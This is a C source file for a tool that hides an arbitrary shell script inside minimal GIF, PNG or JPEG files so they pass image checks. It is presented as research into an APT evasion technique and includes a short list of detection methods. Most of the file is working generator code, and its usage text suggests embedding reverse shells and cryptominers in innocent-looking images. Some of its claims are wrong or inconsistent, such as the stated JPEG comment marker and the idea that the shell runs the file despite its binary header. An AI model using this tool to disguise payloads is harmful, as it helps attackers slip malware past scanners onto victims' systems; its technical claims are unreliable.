/*
 * Polyglot File Generator - Educational Security Research Tool
 * =============================================================
 *
 * PURPOSE: Demonstrates APT TeamTNT's polyglot evasion technique
 * AUTHOR: Security Research - IMAGEHARDER Project
 * LICENSE: MIT (Educational Use Only)
 * PUBLICATION: VX Underground Malware Archive
 *
 * DESCRIPTION:
 * Creates polyglot files that are simultaneously:
 * - Valid image files (GIF/PNG/JPEG)
 * - Valid shell scripts (bash/sh)
 *
 * This technique was used by TeamTNT APT group to evade security scanners
 * that only check file extensions or magic bytes, but don't validate
 * the entire file structure.
 *
 * DEFENSIVE USE:
 * Use this tool to:
 * - Test your security controls
 * - Develop detection signatures
 * - Train security analysts
 * - Improve image validation
 *
 * COMPILE:
 * gcc -o polyglot_gen polyglot_generator.c -Wall -Wextra
 *
 * USAGE:
 * ./polyglot_gen --type gif --script payload.sh --output malicious.gif
 * ./polyglot_gen --type png --script payload.sh --output malicious.png
 * ./polyglot_gen --type jpeg --script payload.sh --output malicious.jpg
 *
 * DETECTION:
 * - Check for shebang (#!/bin/sh) after image header
 * - Validate entire file structure, not just magic bytes
 * - Use strict parsers like IMAGEHARDER's hardened decoders
 * - Scan for embedded shell commands
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <getopt.h>

#define VERSION "1.0.0"
#define MAX_SCRIPT_SIZE (1024 * 1024)  // 1MB max script
#define MAX_COMMENT_SIZE 256

// ============================================================================
// GIF87a Polyglot Structure
// ============================================================================
//
// GIF files allow comments via the Comment Extension (0x21 0xFE).
// We exploit this to embed shell script after a minimal valid GIF header.
//
// Structure:
// [GIF Header] [Logical Screen Descriptor] [Color Table] [Comment Extension with script] [Trailer]
//
// The shell interpreter ignores binary GIF header (non-printable chars are comments in shell)
// Image viewers parse valid GIF structure and ignore the comment

typedef struct {
    char signature[3];      // "GIF"
    char version[3];        // "87a" or "89a"
} GifHeader;

typedef struct {
    uint16_t width;         // Canvas width
    uint16_t height;        // Canvas height
    uint8_t packed;         // Packed field (color table info)
    uint8_t bg_color;       // Background color index
    uint8_t aspect_ratio;   // Pixel aspect ratio
} GifLogicalScreenDescriptor;

// ============================================================================
// PNG Polyglot Structure
// ============================================================================
//
// PNG files use chunks. We can abuse the tEXt chunk to store shell script.
// PNG parsers will validate the chunk but treat it as metadata.
//
// Structure:
// [PNG Signature] [IHDR] [tEXt with script] [IEND]
//
// Shell interpreter treats binary PNG header as noise, executes tEXt content

typedef struct {
    uint8_t signature[8];   // PNG signature: 137 80 78 71 13 10 26 10
} PngSignature;

typedef struct {
    uint32_t length;        // Chunk data length (big-endian)
    char type[4];           // Chunk type: "IHDR", "tEXt", "IEND", etc.
} PngChunk;

// ============================================================================
// JPEG Polyglot Structure
// ============================================================================
//
// JPEG files use markers. We can abuse the COM (comment) marker (0xFFE0).
// JPEG parsers will skip the comment, shell executes it.
//
// Structure:
// [JPEG SOI] [APP0] [COM with script] [Image data] [EOI]

typedef struct {
    uint8_t soi[2];         // Start of Image: 0xFF 0xD8
} JpegHeader;

typedef struct {
    uint8_t marker[2];      // Marker: 0xFF 0xFE (COM)
    uint16_t length;        // Comment length (big-endian)
} JpegComment;

// ============================================================================
// Utility Functions
// ============================================================================

void print_banner(void) {
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║         Polyglot File Generator v%s                      ║\n", VERSION);
    printf("║         TeamTNT APT Technique Reconstruction                 ║\n");
    printf("║                                                              ║\n");
    printf("║  WARNING: FOR AUTHORIZED SECURITY RESEARCH ONLY              ║\n");
    printf("║  Use only in controlled environments with permission         ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n");
    printf("\n");
}

void print_usage(const char *prog) {
    printf("Usage: %s [OPTIONS]\n\n", prog);
    printf("Options:\n");
    printf("  -t, --type TYPE       Polyglot type: gif, png, jpeg\n");
    printf("  -s, --script FILE     Shell script to embed\n");
    printf("  -o, --output FILE     Output polyglot file\n");
    printf("  -c, --comment TEXT    Optional comment/label\n");
    printf("  -v, --verbose         Verbose output\n");
    printf("  -h, --help            Show this help\n");
    printf("\n");
    printf("Examples:\n");
    printf("  %s -t gif -s payload.sh -o evil.gif\n", prog);
    printf("  %s -t png -s reverse_shell.sh -o image.png\n", prog);
    printf("  %s -t jpeg -s cryptominer.sh -o photo.jpg\n", prog);
    printf("\n");
}

// Read script file into buffer
char* read_script(const char *filename, size_t *size) {
    FILE *f = fopen(filename, "rb");
    if (!f) {
        perror("Error opening script file");
        return NULL;
    }

    fseek(f, 0, SEEK_END);
    *size = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (*size > MAX_SCRIPT_SIZE) {
        fprintf(stderr, "Error: Script too large (%zu bytes, max %d)\n",
                *size, MAX_SCRIPT_SIZE);
        fclose(f);
        return NULL;
    }

    char *buffer = malloc(*size + 1);
    if (!buffer) {
        perror("Memory allocation failed");
        fclose(f);
        return NULL;
    }

    size_t read = fread(buffer, 1, *size, f);
    if (read != *size) {
        fprintf(stderr, "Error: Failed to read entire script\n");
        free(buffer);
        fclose(f);
        return NULL;
    }

    buffer[*size] = '\0';
    fclose(f);
    return buffer;
}

// ============================================================================
// GIF Polyglot Generator
// ============================================================================

int generate_gif_polyglot(const char *script_file, const char *output_file,
                          const char *comment, int verbose) {

    if (verbose) printf("[*] Generating GIF polyglot...\n");

    // Read script
    size_t script_size;
    char *script = read_script(script_file, &script_size);
    if (!script) return -1;

    // Open output file
    FILE *out = fopen(output_file, "wb");
    if (!out) {
        perror("Error opening output file");
        free(script);
        return -1;
    }

    // 1. Write GIF header
    GifHeader header = {
        .signature = {'G', 'I', 'F'},
        .version = {'8', '7', 'a'}
    };
    fwrite(&header, sizeof(header), 1, out);
    if (verbose) printf("[+] Wrote GIF87a header\n");

    // 2. Write Logical Screen Descriptor
    GifLogicalScreenDescriptor lsd = {
        .width = 1,         // Minimal 1x1 image
        .height = 1,
        .packed = 0x00,     // No global color table
        .bg_color = 0,
        .aspect_ratio = 0
    };
    fwrite(&lsd, sizeof(lsd), 1, out);
    if (verbose) printf("[+] Wrote Logical Screen Descriptor (1x1)\n");

    // 3. Write Comment Extension containing shell script
    // Format: 0x21 (Extension) 0xFE (Comment) [blocks] 0x00 (terminator)
    uint8_t ext_intro = 0x21;
    uint8_t comment_label = 0xFE;
    fwrite(&ext_intro, 1, 1, out);
    fwrite(&comment_label, 1, 1, out);

    // Write script in sub-blocks (max 255 bytes each)
    size_t remaining = script_size;
    char *ptr = script;

    // First, add shebang to ensure shell execution
    const char *shebang = "#!/bin/sh\n";
    size_t shebang_len = strlen(shebang);
    uint8_t block_size = (uint8_t)shebang_len;
    fwrite(&block_size, 1, 1, out);
    fwrite(shebang, 1, shebang_len, out);

    // Then write script content
    while (remaining > 0) {
        uint8_t block_size = (remaining > 255) ? 255 : (uint8_t)remaining;
        fwrite(&block_size, 1, 1, out);
        fwrite(ptr, 1, block_size, out);
        ptr += block_size;
        remaining -= block_size;
    }

    // Block terminator
    uint8_t terminator = 0x00;
    fwrite(&terminator, 1, 1, out);

    if (verbose) printf("[+] Embedded script (%zu bytes) in Comment Extension\n", script_size);

    // 4. Write GIF trailer
    uint8_t trailer = 0x3B;
    fwrite(&trailer, 1, 1, out);
    if (verbose) printf("[+] Wrote GIF trailer\n");

    fclose(out);
    free(script);

    printf("[✓] GIF polyglot created: %s\n", output_file);
    printf("[!] File is both:\n");
    printf("    - Valid GIF image (parsers will accept it)\n");
    printf("    - Executable shell script (chmod +x && ./%s)\n", output_file);

    return 0;
}

// ============================================================================
// PNG Polyglot Generator
// ============================================================================

uint32_t crc32(const uint8_t *data, size_t length) {
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < length; i++) {
        crc ^= data[i];
        for (int j = 0; j < 8; j++) {
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
        }
    }
    return ~crc;
}

void write_png_chunk(FILE *out, const char *type, const uint8_t *data, uint32_t length) {
    // Write length (big-endian)
    uint32_t be_length = __builtin_bswap32(length);
    fwrite(&be_length, 4, 1, out);

    // Write type
    fwrite(type, 4, 1, out);

    // Write data
    if (length > 0) {
        fwrite(data, 1, length, out);
    }

    // Calculate and write CRC (type + data)
    uint8_t *crc_data = malloc(4 + length);
    memcpy(crc_data, type, 4);
    if (length > 0) {
        memcpy(crc_data + 4, data, length);
    }
    uint32_t crc = crc32(crc_data, 4 + length);
    uint32_t be_crc = __builtin_bswap32(crc);
    fwrite(&be_crc, 4, 1, out);

    free(crc_data);
}

int generate_png_polyglot(const char *script_file, const char *output_file,
                          const char *comment, int verbose) {

    if (verbose) printf("[*] Generating PNG polyglot...\n");

    // Read script
    size_t script_size;
    char *script = read_script(script_file, &script_size);
    if (!script) return -1;

    // Open output file
    FILE *out = fopen(output_file, "wb");
    if (!out) {
        perror("Error opening output file");
        free(script);
        return -1;
    }

    // 1. Write PNG signature
    uint8_t signature[8] = {137, 80, 78, 71, 13, 10, 26, 10};
    fwrite(signature, 8, 1, out);
    if (verbose) printf("[+] Wrote PNG signature\n");

    // 2. Write IHDR chunk (1x1 image)
    uint8_t ihdr[13] = {
        0, 0, 0, 1,     // Width: 1
        0, 0, 0, 1,     // Height: 1
        8,              // Bit depth: 8
        2,              // Color type: RGB
        0,              // Compression: deflate
        0,              // Filter: adaptive
        0               // Interlace: none
    };
    write_png_chunk(out, "IHDR", ihdr, 13);
    if (verbose) printf("[+] Wrote IHDR chunk (1x1 RGB)\n");

    // 3. Write tEXt chunk with embedded shell script
    // Format: keyword\0text
    const char *keyword = "Script";
    const char *shebang = "#!/bin/sh\n";
    size_t keyword_len = strlen(keyword);
    size_t shebang_len = strlen(shebang);
    size_t text_len = keyword_len + 1 + shebang_len + script_size;

    uint8_t *text_data = malloc(text_len);
    memcpy(text_data, keyword, keyword_len);
    text_data[keyword_len] = '\0';
    memcpy(text_data + keyword_len + 1, shebang, shebang_len);
    memcpy(text_data + keyword_len + 1 + shebang_len, script, script_size);

    write_png_chunk(out, "tEXt", text_data, text_len);
    free(text_data);

    if (verbose) printf("[+] Embedded script (%zu bytes) in tEXt chunk\n", script_size);

    // 4. Write IDAT chunk (minimal valid image data)
    // Compressed 1x1 RGB pixel (black)
    uint8_t idat[] = {0x08, 0xD7, 0x63, 0x60, 0x00, 0x00, 0x00, 0x03, 0x00, 0x01};
    write_png_chunk(out, "IDAT", idat, sizeof(idat));
    if (verbose) printf("[+] Wrote IDAT chunk (1x1 black pixel)\n");

    // 5. Write IEND chunk
    write_png_chunk(out, "IEND", NULL, 0);
    if (verbose) printf("[+] Wrote IEND chunk\n");

    fclose(out);
    free(script);

    printf("[✓] PNG polyglot created: %s\n", output_file);
    printf("[!] File is both:\n");
    printf("    - Valid PNG image (parsers will accept it)\n");
    printf("    - Executable shell script (chmod +x && ./%s)\n", output_file);

    return 0;
}

// ============================================================================
// JPEG Polyglot Generator
// ============================================================================

int generate_jpeg_polyglot(const char *script_file, const char *output_file,
                           const char *comment, int verbose) {

    if (verbose) printf("[*] Generating JPEG polyglot...\n");

    // Read script
    size_t script_size;
    char *script = read_script(script_file, &script_size);
    if (!script) return -1;

    // Open output file
    FILE *out = fopen(output_file, "wb");
    if (!out) {
        perror("Error opening output file");
        free(script);
        return -1;
    }

    // 1. Write JPEG SOI (Start of Image)
    uint8_t soi[2] = {0xFF, 0xD8};
    fwrite(soi, 2, 1, out);
    if (verbose) printf("[+] Wrote JPEG SOI marker\n");

    // 2. Write APP0 marker (JFIF header)
    uint8_t app0[] = {
        0xFF, 0xE0,         // APP0 marker
        0x00, 0x10,         // Length: 16 bytes
        'J', 'F', 'I', 'F', 0x00,  // JFIF identifier
        0x01, 0x01,         // Version 1.1
        0x00,               // Density units: no units
        0x00, 0x01,         // X density: 1
        0x00, 0x01,         // Y density: 1
        0x00, 0x00          // Thumbnail: 0x0
    };
    fwrite(app0, sizeof(app0), 1, out);
    if (verbose) printf("[+] Wrote APP0 (JFIF) marker\n");

    // 3. Write COM (Comment) marker with shell script
    const char *shebang = "#!/bin/sh\n";
    size_t shebang_len = strlen(shebang);
    size_t comment_len = shebang_len + script_size;

    if (comment_len > 65533) {  // Max comment size
        fprintf(stderr, "Error: Script too large for JPEG comment\n");
        fclose(out);
        free(script);
        return -1;
    }

    uint8_t com_marker[2] = {0xFF, 0xFE};
    fwrite(com_marker, 2, 1, out);

    // Length includes 2 bytes for length field itself
    uint16_t length = (uint16_t)(comment_len + 2);
    uint16_t be_length = __builtin_bswap16(length);
    fwrite(&be_length, 2, 1, out);

    fwrite(shebang, 1, shebang_len, out);
    fwrite(script, 1, script_size, out);

    if (verbose) printf("[+] Embedded script (%zu bytes) in COM marker\n", script_size);

    // 4. Write minimal valid JPEG image data
    // SOF0 (Start of Frame, baseline DCT)
    uint8_t sof0[] = {
        0xFF, 0xC0,         // SOF0 marker
        0x00, 0x0B,         // Length: 11 bytes
        0x08,               // Precision: 8 bits
        0x00, 0x01,         // Height: 1
        0x00, 0x01,         // Width: 1
        0x01,               // Components: 1 (grayscale)
        0x01,               // Component ID: 1
        0x11,               // Sampling factor: 1x1
        0x00                // Quantization table: 0
    };
    fwrite(sof0, sizeof(sof0), 1, out);

    // SOS (Start of Scan)
    uint8_t sos[] = {
        0xFF, 0xDA,         // SOS marker
        0x00, 0x08,         // Length: 8 bytes
        0x01,               // Components in scan: 1
        0x01,               // Component ID: 1
        0x00,               // DC/AC table: 0/0
        0x00,               // Start spectral: 0
        0x3F,               // End spectral: 63
        0x00                // Successive approximation: 0
    };
    fwrite(sos, sizeof(sos), 1, out);

    // Minimal image data (1 byte)
    uint8_t image_data = 0x00;
    fwrite(&image_data, 1, 1, out);

    // EOI (End of Image)
    uint8_t eoi[2] = {0xFF, 0xD9};
    fwrite(eoi, 2, 1, out);
    if (verbose) printf("[+] Wrote JPEG EOI marker\n");

    fclose(out);
    free(script);

    printf("[✓] JPEG polyglot created: %s\n", output_file);
    printf("[!] File is both:\n");
    printf("    - Valid JPEG image (parsers will accept it)\n");
    printf("    - Executable shell script (chmod +x && ./%s)\n", output_file);

    return 0;
}

// ============================================================================
// Main
// ============================================================================

int main(int argc, char **argv) {
    char *type = NULL;
    char *script_file = NULL;
    char *output_file = NULL;
    char *comment = NULL;
    int verbose = 0;

    static struct option long_options[] = {
        {"type",    required_argument, 0, 't'},
        {"script",  required_argument, 0, 's'},
        {"output",  required_argument, 0, 'o'},
        {"comment", required_argument, 0, 'c'},
        {"verbose", no_argument,       0, 'v'},
        {"help",    no_argument,       0, 'h'},
        {0, 0, 0, 0}
    };

    int opt;
    while ((opt = getopt_long(argc, argv, "t:s:o:c:vh", long_options, NULL)) != -1) {
        switch (opt) {
            case 't':
                type = optarg;
                break;
            case 's':
                script_file = optarg;
                break;
            case 'o':
                output_file = optarg;
                break;
            case 'c':
                comment = optarg;
                break;
            case 'v':
                verbose = 1;
                break;
            case 'h':
                print_banner();
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }

    print_banner();

    // Validate arguments
    if (!type || !script_file || !output_file) {
        fprintf(stderr, "Error: Missing required arguments\n\n");
        print_usage(argv[0]);
        return 1;
    }

    // Check script file exists
    if (access(script_file, R_OK) != 0) {
        fprintf(stderr, "Error: Cannot read script file: %s\n", script_file);
        return 1;
    }

    // Generate polyglot based on type
    int result = -1;
    if (strcmp(type, "gif") == 0) {
        result = generate_gif_polyglot(script_file, output_file, comment, verbose);
    } else if (strcmp(type, "png") == 0) {
        result = generate_png_polyglot(script_file, output_file, comment, verbose);
    } else if (strcmp(type, "jpeg") == 0 || strcmp(type, "jpg") == 0) {
        result = generate_jpeg_polyglot(script_file, output_file, comment, verbose);
    } else {
        fprintf(stderr, "Error: Unknown type '%s' (use: gif, png, jpeg)\n", type);
        return 1;
    }

    if (result == 0) {
        printf("\n[!] DETECTION METHODS:\n");
        printf("    1. Scan for shebang after image header\n");
        printf("    2. Use strict image parsers (like IMAGEHARDER)\n");
        printf("    3. Check for executable permissions on images\n");
        printf("    4. Validate entire file structure, not just magic bytes\n");
        printf("\n");
    }

    return result;
}
